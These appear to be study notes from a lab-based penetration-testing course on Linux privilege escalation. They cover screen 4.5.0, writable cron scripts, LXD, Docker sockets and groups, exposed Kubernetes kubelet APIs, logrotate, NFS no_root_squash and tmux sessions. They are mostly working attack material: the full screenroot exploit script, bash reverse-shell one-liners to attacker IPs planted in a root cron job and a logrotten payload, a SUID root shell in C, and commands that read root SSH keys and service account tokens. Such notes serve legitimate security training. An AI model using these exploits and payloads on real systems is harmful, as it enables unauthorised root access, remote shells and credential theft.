 ## 1- Vulnerable Services
```bash
ls -l /bin /usr/bin/ /usr/sbin/ 
  # -rwsr-xr-x 1 root   root     1588768 Aug 31  2020 screen-4.5.0
```
Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
```bash
screen -v
  # Screen version 4.05.00 (GNU) 10-Dec-16
```
This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.
#### Privilege Escalation - Screen_Exploit.sh
```bash
./screen_exploit.sh 
  # [+] done!
id # uid=0(root) gid=0(root) groups=0(root)
```
#### Screen_Exploit_POC.sh
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```


---

## 2- Cron Job Abuse
Cron jobs schedule tasks to run automatically (once, on boot, or repeatedly) for admin tasks like backups or cleanup. formate: `<minute hour day month weekday command.>`
They’re created with `crontab` and stored in `/var/spool/cron` per user.
```bash
0 */12 * * * /home/admin/backup.sh → runs every 12 hours.
```

The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, **even if you cannot read the crontab to know the exact schedule, you may be able to see how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.**

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.
let search for for any writeable files or directories:
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
  # /dmz-backups/backup.sh
  
ls -la /dmz-backups/
  # -rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh  
```
1. A quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes
2. the `backup.sh` shell script is world writeable and runs as root.
We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).
```bash
./pspy64 -pf -i 1000
  # 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
  # 20:46:01 FS:  OPEN | /usr/lib/locale/locale-archive 
  # 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
  # 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
```
From the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root.
```bash
cat /dmz-backups/backup.sh 
 #!/bin/bash# 
 # tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html
```
we confirm the file creates a tarball of the source directory in  the web root directory. 
Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
```bash
cat /dmz-backups/backup.sh 
 #!/bin/bash# 
 # tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```
We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!
```bash
nc -lnvp 443
  # root@NIX02:~# id
```


---

##  3- Containers (LXD)
Containers share the host OS and isolate application processes, while virtual machines virtualize hardware and run multiple full operating systems.

Isolation and virtualization improve security and resource management by separating processes, simplifying monitoring, and preventing privileged applications (like web apps or APIs) from affecting the host system or other services.
#### Linux Containers
Linux Containers (LXC) provide OS-level virtualization by running isolated Linux environments that share the host kernel, using fewer resources than virtual machines.

They are easy to manage, portable across systems and clouds, and allow applications to be started, stopped, or reconfigured quickly. Their widespread adoption is largely driven by Docker, which standardized and popularized the Linux container ecosystem.
##### Linux Daemon
Linux Daemon (**LXD**) runs full system containers rather than application containers. To use LXD (and potentially escalate privileges), the user must belong to the **lxc** or **lxd** group
```bash
id
  # uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
LXC/LXD can be exploited by creating and importing a custom container or by using an existing one. Poorly secured templates are common, often giving attackers preinstalled tools to abuse the system.
```bash
cd ContainerImages && ls 
  # ubuntu-template.tar.xz
```
These templates often lack passwords, especially in simple test setups where ease of use is prioritized over security. If such a container exists, it can be exploited by importing it as an image.
```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
  # ubuntu/18.04 (v1.1.2)
```
After importing the image, we start and configure it with `security.privileged`, which disables isolation and allows interaction with the host system.
```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.
```bash
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```


---

## 4- Docker
Docker is an open-source platform that runs applications in lightweight containers sharing the host OS, using fewer resources than virtual machines. Each Docker container packages everything needed to run an application in a portable, consistent environment.
#### Docker Architecture
At the core of the Docker architecture lies a client-server model, where we have two primary components:
- **The Docker daemon**: acts as our interface for issuing commands and interacting with the Docker ecosystem
- **The Docker client**: responsible for executing those commands and managing containers.

##### Docker Daemon
The Docker Daemon is the core Docker service responsible for running, interacting with, and managing containers on the host system.
###### Managing Docker Containers
The Docker Daemon creates, runs, and monitors containers while keeping them isolated from the host and each other. It also manages images, pulls them from registries, and provides logging, monitoring, and resource usage insights for troubleshooting and optimization.
###### Network and Storage
The Docker Daemon manages container networking, enabling communication via virtual networks, ports, and IPs. It also handles storage through Docker volumes, allowing data to persist and be shared independently of containers.
##### Docker Clients
The Docker Client lets us interact with the Docker Daemon to create, manage, and remove containers, as well as pull, build, and push images. **Docker Compose** extends this by orchestrating multi-container applications using a YAML file, defining services, dependencies, networks, and volumes for a complete, interconnected stack.
##### Docker Desktop
Docker Desktop offers a GUI for Mac, Windows, and Linux, making it easy to manage containers, view logs, monitor status, and control resources. It provides a visual, user-friendly interface and also supports **Kubernetes**.
##### Docker Images and Containers
A Docker **image** is a read-only blueprint containing an app’s code, dependencies, and configs. A **container** is a runnable instance of an image, isolated with its own filesystem, processes, and network. Images are immutable, while containers can be modified at runtime, though changes aren’t saved unless committed or stored in a volume.
#### Docker Privilege Escalation
If we gain access to users who can manage Docker containers, we may exploit Docker to escalate privileges or escape the container and gain higher access on the host system.
##### Docker Shared Directories
Docker shared directories (volumes) link host paths to container paths, allowing data persistence and file sharing. They can be mounted read-only or read-write, depending on security and usage requirements.

When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.
```bash
cd /hostsystem/home/cry0l1t3
ls -l
  # .ssh
cat .ssh/id_rsa # -----BEGIN RSA PRIVATE KEY-----
```
From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.
```bash
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```
##### Docker Sockets
**Docker socket**s enable communication between the Docker client and the Docker daemon via Unix or network sockets. Access is permission‑restricted, but if **exposed** or **misconfigured**, it can allow remote control of Docker and potentially be abused to escape containers or gain higher privileges.
```bash
~/app$ ls -al
  # srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock (SID)
```
we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x86_64/docker) and upload it to the Docker container.
```bash
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l # -rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
/tmp/docker -H unix:///app/docker.sock ps
  # 3fe8a4782311     main_app  443/tcp   app
```
We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.
```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
  # 7ae3bcc818af     main_app      443/tcp   app
  # 3fe8a4782311     main_app      443/tcp   app
```
Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
```bash
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
# root@ ~#
cat /hostsystem/root/.ssh/id_rsa # -----BEGIN RSA PRIVATE KEY-----
```
From there, we can again try to grab the private SSH key and log in as root or as any other user on the system with a private SSH key in its folder.
##### Docker Group
To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.
```bash
id
  # uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
Alternatively, **Docker may have SUID set**, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

Most hosts have a direct internet connection because the base images and containers must be downloaded. However, many hosts may be disconnected from the internet at night and outside working hours for security reasons. However, if these hosts are located in a network where, for example, a web server has to pass through, it can still be reached.

To see which images exist and which we can access, we can use the following command:
```bash
docker-user@nix02:~$ docker image ls
  # ubuntu    20fffa419e3a    72.8MB
```
so we can **Run a container as root and mount the host filesystem**
```bash
# 1. Run the Ubuntu container with host filesystem mounted
docker run -it --rm -v /:/mnt ubuntu /bin/bash
# 2. Switch to the host system
chroot /mnt /bin/bash # or cd /tmnt
# 3. Confirm root access
id # # uid=0(root) gid=0(root)
```
##### Docker Socket

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# root@ubuntu:~#
ls -l  # ROOT dir
```
## 5- Kubernetes
Kubernetes is an open-source container orchestration platform that simplifies deployment, scaling, and management of applications. Developed by Google and now maintained by the Cloud Native Computing Foundation, it isolates applications in containers and runs them across master and worker nodes. K8s is widely used in DevOps for microservices and requires attention to security when accessing containers during penetration testing.

#### K8s Concept
Kubernetes organizes containers into **pods**, each with its own IP and hostname. It manages multiple containers with features like load balancing, service discovery, storage orchestration, and self-healing. Security tools include RBAC, Network Policies, and Security Contexts.
**Docker vs Kubernetes:**
- Docker: container platform, manual scaling, single network, volumes
- Kubernetes: container orchestration, automatic scaling, complex networks, diverse storage

**Architecture:**
- **Control Plane (master):** manages the cluster
- **Worker Nodes:(minions)** run the containerized application
##### Nodes
- **Master Node:** Hosts the Control Plane, managing the cluster and ensuring the desired state.
- **Worker Nodes (Minions):** Run applications, following instructions from the Control Plane.
Kubernetes supports diverse workloads (databases, AI/ML, microservices), handles high-resource apps, and works across public clouds (GCP, Azure, AWS) or private data centers.
##### Control Plane
The Control Plane manages the Kubernetes cluster, using components like **etcd, API server, Scheduler, and Controller Manager** to make decisions and maintain cluster state. Key ports

|**Service**|**TCP Ports**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|
##### Minions
Minions run the containerized applications and are managed by the Control Plane. The **Scheduler** decides where pods run, the **API server** updates **etcd**, and all components work together to maintain cluster state and ensure smooth operation.
#### K8's Security Measures
Kubernetes security can be divided into several domains:
- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security
Each domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.
#### Kubernetes API
The Kubernetes API is the central interface for managing the cluster. Hosted by the **kube-apiserver**, it allows users to define the desired state, and Kubernetes ensures it is achieved. API resources like **Pods, Services, and Deployments** support operations such as **GET, POST, PUT, PATCH, and DELETE** for creating, updating, or deleting resources.
##### K8's API Server Interaction
Accessing the API server without credentials (`system:anonymous`) is blocked. For example:
```bash
curl https://10.129.10.11:6443 -k # "code": 403
 # message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
```
Returns a **403 Forbidden**, because unauthenticated users cannot access sensitive paths like `/`. Only authorized users with proper credentials can interact with the cluster.
##### Kubelet API - Extracting Pods
If the **Kubelet API (port 10250)** is exposed, it may allow unauthenticated access to pod data:
```bash
curl https://10.129.10.11:10250/pods -k
...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```

The information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.

Understanding the container images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them to gain unauthorized access to the system. Namespace information can provide insights into how the pods and resources are arranged within the cluster, which we can use to target specific namespaces with known vulnerabilities. We can also use metadata such as `uid` and `resourceVersion` to perform reconnaissance and recognize potential targets for further attacks. Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.
##### Kubeletctl - Extracting Pods
```bash
kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```
##### Kubelet API - Available Commands
```bash
kubeletctl -i --server 10.129.10.11 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```
It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.
##### Kubelet API - Executing Commands
```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
  # uid=0(root) gid=0(root) groups=0(root)
```
the `id` command inside the container has root privileges. This indicates that we have gained administrative access within the container, **which could potentially lead to privilege escalation vulnerabilities**. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.
#### Privilege Escalation
To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.
##### Kubelet API - Extracting Tokens
```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
  # eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```
##### Kubelet API - Extracting Certificates
```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
  # -----BEGIN CERTIFICATE----- ..
```
Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.
##### List Privileges
```bash
export token=`cat k8.token`
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP... 
```
Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:
##### Pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Once created, we can now create the new pod and check if it is running as expected.
##### Creating a new Pod
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
  # pod/privesc created
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods  
```
If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.
##### Extracting Root's SSH Key
```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
  # -----BEGIN OPENSSH PRIVATE KEY-----
```
## 6-Logrotate
Logrotate manages log files by rotating, compressing, and deleting old logs to prevent disks from filling up. It keeps `/var/log` organized, saves disk space, and makes logs easier and faster to search while preserving important system and service information.

Logrotate manages log files based on **size**, **age**, and defined **actions** (rotate, compress, delete). It rotates logs by renaming old files and creating new ones (e.g., daily logs), preventing disk overflow and reducing storage usage.
```bash
logrotate --help
```
This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.
```bash
cat /etc/logrotate.conf

# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here
```
To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:
```bash
sudo cat /var/lib/logrotate.status #=> /var/log/samba/log.smbd" 2022-8-3
```
We can find the corresponding configuration files in `/etc/logrotate.d/` directory.
```bash
ls /etc/logrotate.d/
  # alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

To exploit `logrotate`, we need some requirements that we have to fulfill.
1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.
```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
Next, we need a payload to be executed , we will use simple bash reverse-shell
```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.
```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
  # create
```
In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.
After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.
```bash
nc -nlvp 9001
```
As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.
```bash
./logrotten -p ./payload /tmp/tmp.log
```
```bash
Connection received on 10.129.24.11 49818
# id => uid=0(root) gid=0(root) groups=0(root)
```



---

## 7- Miscellaneous Techniques
####  Passive Traffic Capture
If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.
#### Weak NFS Privileges
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049.
Any accessible mounts can be listed remotely by issuing the command 
```bash
showmount -e 10.129.2.12
  # Export list for 10.129.2.12:
  # /tmp             *
  # /var/nfs/general *
```
 which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

When an NFS volume is created, various options can be set:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |
|                  |                                                                                                                                                                                                                                                                                               |

```bash
cat /etc/exports
  # /var/nfs/general *(rw,no_root_squash)
  # /tmp *(rw,no_root_squash)
```
For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.
```c
// cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```bash
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
ls -la
  # -rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
```
on the target nfs server
```bash
./shell
id # uid=0(root) gid=0(root) groups=0(root),
```
#### Hijacking Tmux Sessions
Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.
```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```
If we can compromise a user in the `devs` group, we can attach to this session and gain root access.
```bash
ps aux | grep tmux
  # root     4806  0.0  0.1  29416  3204 ?   Ss   tmux -S /shareds new -s debugsess
```
Confirm permissions.
```bash
ls -la /shareds 
```
Review our group membership.
```bash
 id
  # uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```
Finally, attach to the `tmux` session and confirm root privileges.
```bash
tmux -S /shareds
```
